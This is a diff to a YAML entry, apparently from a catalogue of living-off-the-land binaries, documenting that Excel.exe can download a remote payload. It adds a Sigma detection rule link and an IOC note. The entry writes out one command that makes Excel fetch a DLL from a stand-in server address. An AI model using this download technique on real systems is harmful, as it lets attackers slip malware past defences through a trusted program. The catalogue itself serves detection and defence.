@@ -2,7 +2,7 @@
 Name: Excel.exe
 Description: Microsoft Office binary
 Author: 'Reegun J (OCBC Bank)'
-Created: '2019-07-19'
+Created: 2019-07-19
 Commands:
   - Command: Excel.exe http://192.168.1.10/TeamsAddinLoader.dll
     Description: Downloads payload from remote server
@@ -10,7 +10,6 @@ Commands:
     Category: Download
     Privileges: User
     MitreID: T1105
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
     OperatingSystem: Windows
 Full_Path:
   - Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Excel.exe
@@ -31,11 +30,11 @@ Full_Path:
 Code_Sample:
   - Code:
 Detection:
-  - IOC:
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_msoffice.yml
+  - IOC: Suspicious Office application Internet/network traffic
 Resources:
   - Link: https://twitter.com/reegun21/status/1150032506504151040
   - Link: https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191
 Acknowledgement:
   - Person: 'Reegun J (OCBC Bank)'
     Handle: '@reegun21'
----
